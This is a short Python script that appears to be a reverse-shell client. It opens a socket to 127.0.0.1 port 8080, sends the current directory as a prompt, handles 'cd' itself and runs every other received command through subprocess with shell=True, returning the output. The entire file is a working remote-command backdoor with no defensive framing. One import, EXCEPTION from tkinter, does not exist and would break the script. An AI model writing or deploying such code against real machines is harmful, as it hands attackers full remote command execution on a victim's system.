import subprocess
import socket
import os
from tkinter import EXCEPTION
ip_address="127.0.0.1"
port=8080
client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("initiating process")
client.connect((ip_address,port))
print("connection intitated")
while True:
    print("[-] wainting for commands")
    client.send("{}$".format(os.getcwd()).encode())
    command=client.recv(1024)
    command= command.decode()
    # check commands
    # change directory
    if command.split()[0]=="cd":
        try:
            os.chdir(command.split()[1])
            client.send("Changed directory to {}".format(os.getcwd()).encode())
        except Exception as e:
            client.send(f"{e}".encode())
        
    else:
        op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        output_error=op.stderr.read()
        output=op.stdout.read()
        print("sending response")
        client.send(output+output_error)
    
    
    